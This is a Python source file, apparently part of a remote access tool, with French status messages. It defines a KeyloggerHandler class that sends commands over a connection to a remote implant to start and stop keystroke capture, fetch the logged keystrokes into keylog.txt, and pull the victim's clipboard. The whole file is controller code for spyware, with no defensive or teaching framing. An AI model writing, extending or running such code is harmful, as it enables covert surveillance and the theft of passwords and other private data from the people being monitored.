class KeyloggerHandler:
    def __init__(self, conn_manager):
        self.conn_manager = conn_manager
        self.logging = False
        self.log_file = "keylog.txt"
        
    def start_logging(self):
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie."
        
        try:
            self.conn_manager.conn.send(b"START_KEYLOG")
            self.logging = True
            return "[+] Keylogger démarré"
        except Exception as e:
            return f"[!] Erreur: {str(e)}"
            
    def stop_logging(self):
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie."
            
        try:
            self.conn_manager.conn.send(b"STOP_KEYLOG")
            self.logging = False
            return "[+] Keylogger arrêté"
        except Exception as e:
            return f"[!] Erreur: {str(e)}"
            
    def get_logs(self):
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie.", ""
            
        try:
            self.conn_manager.conn.send(b"GET_KEYLOGS")
            logs = self.conn_manager.conn.recv(4096).decode()
            with open(self.log_file, "w") as f:
                f.write(logs)
            return "[+] Logs reçus", logs
        except Exception as e:
            return f"[!] Erreur: {str(e)}", ""
            
    def get_clipboard(self):
        if not self.conn_manager.conn:
            return "[!] Pas de connexion établie.", ""
            
        try:
            self.conn_manager.conn.send(b"GET_CLIPBOARD")
            clipboard_content = self.conn_manager.conn.recv(4096).decode()
            return "[+] Presse-papiers récupéré", clipboard_content
        except Exception as e:
            return f"[!] Erreur: {str(e)}", ""